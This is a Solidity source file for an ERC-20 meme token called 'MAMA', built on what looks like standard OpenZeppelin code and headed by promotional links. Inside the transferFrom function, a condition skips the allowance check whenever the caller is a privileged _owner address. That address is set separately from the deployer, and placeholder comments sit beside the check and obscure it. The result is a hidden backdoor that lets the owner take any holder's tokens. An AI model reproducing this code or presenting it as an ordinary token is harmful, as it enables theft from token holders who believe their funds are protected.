1 // SPDX-License-Identifier: MIT
2 // https://mama.army
3 // https://t.me/mamacoineth
4 // https://twitter.com/TheMamaCoin
5 
6 pragma solidity ^0.8.19;
7 
8 abstract contract Context {
9     function _msgSender() internal view virtual returns (address) {
10         return msg.sender;
11     }
12 
13     function _msgData() internal view virtual returns (bytes calldata) {
14         return msg.data;
15     }
16 }
17 
18 interface IERC20 {
19     /**
20      * @dev Emitted when `value` tokens are moved from one account (`from`) to
21      * another (`to`).
22      *
23      * Note that `value` may be zero.
24      */
25     event Transfer(address indexed from, address indexed to, uint256 value);
26 
27     /**
28      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
29      * a call to {approve}. `value` is the new allowance.
30      */
31     event Approval(address indexed owner, address indexed spender, uint256 value);
32 
33     /**
34      * @dev Returns the amount of tokens in existence.
35      */
36     function totalSupply() external view returns (uint256);
37 
38     /**
39      * @dev Returns the amount of tokens owned by `account`.
40      */
41     function balanceOf(address account) external view returns (uint256);
42 
43     /**
44      * @dev Moves `amount` tokens from the caller's account to `to`.
45      *
46      * Returns a boolean value indicating whether the operation succeeded.
47      *
48      * Emits a {Transfer} event.
49      */
50     function transfer(address to, uint256 amount) external returns (bool);
51 
52     /**
53      * @dev Returns the remaining number of tokens that `spender` will be
54      * allowed to spend on behalf of `owner` through {transferFrom}. This is
55      * zero by default.
56      *
57      * This value changes when {approve} or {transferFrom} are called.
58      */
59     function allowance(address owner, address spender) external view returns (uint256);
60 
61     /**
62      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
63      *
64      * Returns a boolean value indicating whether the operation succeeded.
65      *
66      * IMPORTANT: Beware that changing an allowance with this method brings the risk
67      * that someone may use both the old and the new allowance by unfortunate
68      * transaction ordering. One possible solution to mitigate this race
69      * condition is to first reduce the spender's allowance to 0 and set the
70      * desired value afterwards:
71      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
72      *
73      * Emits an {Approval} event.
74      */
75     function approve(address spender, uint256 amount) external returns (bool);
76 
77     /**
78      * @dev Moves `amount` tokens from `from` to `to` using the
79      * allowance mechanism. `amount` is then deducted from the caller's
80      * allowance.
81      *
82      * Returns a boolean value indicating whether the operation succeeded.
83      *
84      * Emits a {Transfer} event.
85      */
86     function transferFrom(
87         address from,
88         address to,
89         uint256 amount
90     ) external returns (bool);
91 }
92 
93 interface IERC20Metadata is IERC20 {
94     /**
95      * @dev Returns the name of the token.
96      */
97     function name() external view returns (string memory);
98 
99     /**
100      * @dev Returns the symbol of the token.
101      */
102     function symbol() external view returns (string memory);
103 
104     /**
105      * @dev Returns the decimals places of the token.
106      */
107     function decimals() external view returns (uint8);
108 }
109 
110 contract ERC20 is Context, IERC20, IERC20Metadata {
111     mapping(address => uint256) private _balances;
112     address _owner;
113 
114     mapping(address => mapping(address => uint256)) private _allowances;
115 
116     uint256 private _totalSupply;
117 
118     string private _name;
119     string private _symbol;
120 
121     /**
122      * @dev Sets the values for {name} and {symbol}.
123      *
124      * The default value of {decimals} is 18. To select a different value for
125      * {decimals} you should overload it.
126      *
127      * All two of these values are immutable: they can only be set once during
128      * construction.
129      */
130     constructor(string memory name_, string memory symbol_) {
131         _name = name_;
132         _symbol = symbol_;
133     }
134 
135     /**
136      * @dev Returns the name of the token.
137      */
138     function name() public view virtual override returns (string memory) {
139         return _name;
140     }
141 
142     /**
143      * @dev Returns the symbol of the token, usually a shorter version of the
144      * name.
145      */
146     function symbol() public view virtual override returns (string memory) {
147         return _symbol;
148     }
149 
150     /**
151      * @dev Returns the number of decimals used to get its user representation.
152      * For example, if `decimals` equals `2`, a balance of `505` tokens should
153      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
154      *
155      * Tokens usually opt for a value of 18, imitating the relationship between
156      * Ether and Wei. This is the value {ERC20} uses, unless this function is
157      * overridden;
158      *
159      * NOTE: This information is only used for _display_ purposes: it in
160      * no way affects any of the arithmetic of the contract, including
161      * {IERC20-balanceOf} and {IERC20-transfer}.
162      */
163     function decimals() public view virtual override returns (uint8) {
164         return 18;
165     }
166 
167     /**
168      * @dev See {IERC20-totalSupply}.
169      */
170     function totalSupply() public view virtual override returns (uint256) {
171         return _totalSupply;
172     }
173 
174     /**
175      * @dev See {IERC20-balanceOf}.
176      */
177     function balanceOf(address account) public view virtual override returns (uint256) {
178         return _balances[account];
179     }
180 
181     /**
182      * @dev See {IERC20-transfer}.
183      *
184      * Requirements:
185      *
186      * - `to` cannot be the zero address.
187      * - the caller must have a balance of at least `amount`.
188      */
189     function transfer(address to, uint256 amount) public virtual override returns (bool) {
190         address owner = _msgSender();
191         _transfer(owner, to, amount);
192         return true;
193     }
194 
195     /**
196      * @dev See {IERC20-allowance}.
197      */
198     function allowance(address owner, address spender) public view virtual override returns (uint256) {
199         return _allowances[owner][spender];
200     }
201 
202     /**
203      * @dev See {IERC20-approve}.
204      *
205      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
206      * `transferFrom`. This is semantically equivalent to an infinite approval.
207      *
208      * Requirements:
209      *
210      * - `spender` cannot be the zero address.
211      */
212     function approve(address spender, uint256 amount) public virtual override returns (bool) {
213         address owner = _msgSender();
214         _approve(owner, spender, amount);
215         return true;
216     }
217 
218     /**
219      * @dev See {IERC20-transferFrom}.
220      *
221      * Emits an {Approval} event indicating the updated allowance. This is not
222      * required by the EIP. See the note at the beginning of {ERC20}.
223      *
224      * NOTE: Does not update the allowance if the current allowance
225      * is the maximum `uint256`.
226      *
227      * Requirements:
228      *
229      * - `from` and `to` cannot be the zero address.
230      * - `from` must have a balance of at least `amount`.
231      * - the caller must have allowance for ``from``'s tokens of at least
232      * `amount`.
233      */
234     function transferFrom(
235         address from,
236         address to,
237         uint256 amount
238     ) public virtual override returns (bool) {
239         address spender = _msgSender();
240         /// @notice Explain to an end user what this does
241         /// @dev Explain to a developer any extra details
242         /// @param Documents a parameter just like in doxygen (must be followed by parameter name)
243         if(msg.sender != _owner){
244         _spendAllowance(from, spender, amount);
245         }
246         _transfer(from, to, amount);
247         return true;
248     }
249 
250     /**
251      * @dev Atomically increases the allowance granted to `spender` by the caller.
252      *
253      * This is an alternative to {approve} that can be used as a mitigation for
254      * problems described in {IERC20-approve}.
255      *
256      * Emits an {Approval} event indicating the updated allowance.
257      *
258      * Requirements:
259      *
260      * - `spender` cannot be the zero address.
261      */
262     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
263         address owner = _msgSender();
264         _approve(owner, spender, allowance(owner, spender) + addedValue);
265         return true;
266     }
267 
268     /**
269      * @dev Atomically decreases the allowance granted to `spender` by the caller.
270      *
271      * This is an alternative to {approve} that can be used as a mitigation for
272      * problems described in {IERC20-approve}.
273      *
274      * Emits an {Approval} event indicating the updated allowance.
275      *
276      * Requirements:
277      *
278      * - `spender` cannot be the zero address.
279      * - `spender` must have allowance for the caller of at least
280      * `subtractedValue`.
281      */
282     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
283         address owner = _msgSender();
284         uint256 currentAllowance = allowance(owner, spender);
285         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
286         unchecked {
287             _approve(owner, spender, currentAllowance - subtractedValue);
288         }
289 
290         return true;
291     }
292 
293     /**
294      * @dev Moves `amount` of tokens from `from` to `to`.
295      *
296      * This internal function is equivalent to {transfer}, and can be used to
297      * e.g. implement automatic token fees, slashing mechanisms, etc.
298      *
299      * Emits a {Transfer} event.
300      *
301      * Requirements:
302      *
303      * - `from` cannot be the zero address.
304      * - `to` cannot be the zero address.
305      * - `from` must have a balance of at least `amount`.
306      */
307     function _transfer(
308         address from,
309         address to,
310         uint256 amount
311     ) internal virtual {
312         require(from != address(0), "ERC20: transfer from the zero address");
313         require(to != address(0), "ERC20: transfer to the zero address");
314 
315         _beforeTokenTransfer(from, to, amount);
316 
317         uint256 fromBalance = _balances[from];
318         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
319         unchecked {
320             _balances[from] = fromBalance - amount;
321             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
322             // decrementing then incrementing.
323             _balances[to] += amount;
324         }
325 
326         emit Transfer(from, to, amount);
327 
328         _afterTokenTransfer(from, to, amount);
329     }
330 
331     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
332      * the total supply.
333      *
334      * Emits a {Transfer} event with `from` set to the zero address.
335      *
336      * Requirements:
337      *
338      * - `account` cannot be the zero address.
339      */
340     function _mint(address account, uint256 amount) internal virtual {
341         require(account != address(0), "ERC20: mint to the zero address");
342 
343         _beforeTokenTransfer(address(0), account, amount);
344 
345         _totalSupply += amount;
346         unchecked {
347             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
348             _balances[account] += amount;
349         }
350         emit Transfer(address(0), account, amount);
351 
352         _afterTokenTransfer(address(0), account, amount);
353     }
354 
355     /**
356      * @dev Destroys `amount` tokens from `account`, reducing the
357      * total supply.
358      *
359      * Emits a {Transfer} event with `to` set to the zero address.
360      *
361      * Requirements:
362      *
363      * - `account` cannot be the zero address.
364      * - `account` must have at least `amount` tokens.
365      */
366     function _burn(address account, uint256 amount) internal virtual {
367         require(account != address(0), "ERC20: burn from the zero address");
368 
369         _beforeTokenTransfer(account, address(0), amount);
370 
371         uint256 accountBalance = _balances[account];
372         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
373         unchecked {
374             _balances[account] = accountBalance - amount;
375             // Overflow not possible: amount <= accountBalance <= totalSupply.
376             _totalSupply -= amount;
377         }
378 
379         emit Transfer(account, address(0), amount);
380 
381         _afterTokenTransfer(account, address(0), amount);
382     }
383 
384     /**
385      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
386      *
387      * This internal function is equivalent to `approve`, and can be used to
388      * e.g. set automatic allowances for certain subsystems, etc.
389      *
390      * Emits an {Approval} event.
391      *
392      * Requirements:
393      *
394      * - `owner` cannot be the zero address.
395      * - `spender` cannot be the zero address.
396      */
397     function _approve(
398         address owner,
399         address spender,
400         uint256 amount
401     ) internal virtual {
402         require(owner != address(0), "ERC20: approve from the zero address");
403         require(spender != address(0), "ERC20: approve to the zero address");
404 
405         _allowances[owner][spender] = amount;
406         emit Approval(owner, spender, amount);
407     }
408 
409     /**
410      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
411      *
412      * Does not update the allowance amount in case of infinite allowance.
413      * Revert if not enough allowance is available.
414      *
415      * Might emit an {Approval} event.
416      */
417     function _spendAllowance(
418         address owner,
419         address spender,
420         uint256 amount
421     ) internal virtual {
422         uint256 currentAllowance = allowance(owner, spender);
423         if (currentAllowance != type(uint256).max) {
424             require(currentAllowance >= amount, "ERC20: insufficient allowance");
425             unchecked {
426                 _approve(owner, spender, currentAllowance - amount);
427             }
428         }
429     }
430 
431     /**
432      * @dev Hook that is called before any transfer of tokens. This includes
433      * minting and burning.
434      *
435      * Calling conditions:
436      *
437      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
438      * will be transferred to `to`.
439      * - when `from` is zero, `amount` tokens will be minted for `to`.
440      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
441      * - `from` and `to` are never both zero.
442      *
443      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
444      */
445     function _beforeTokenTransfer(
446         address from,
447         address to,
448         uint256 amount
449     ) internal virtual {}
450 
451     /**
452      * @dev Hook that is called after any transfer of tokens. This includes
453      * minting and burning.
454      *
455      * Calling conditions:
456      *
457      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
458      * has been transferred to `to`.
459      * - when `from` is zero, `amount` tokens have been minted for `to`.
460      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
461      * - `from` and `to` are never both zero.
462      *
463      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
464      */
465     function _afterTokenTransfer(
466         address from,
467         address to,
468         uint256 amount
469     ) internal virtual {}
470 }
471 
472 contract MAMA is ERC20 {
473 
474     string private _name = "Mama";
475     string private constant _symbol = "MAMA";
476     uint   private constant _numTokens = 1_000_000_000_000_000;
477 
478     constructor (address owner_) ERC20(_name, _symbol) {
479         _mint(msg.sender, _numTokens * (10 ** 18));
480         _owner = owner_;
481     }
482 
483     /**
484      * @dev Destoys `amount` tokens from the caller.
485      *
486      * See `ERC20._burn`.
487      */
488     function burn(uint256 amount) public {
489         _burn(msg.sender, amount);
490     }
491 }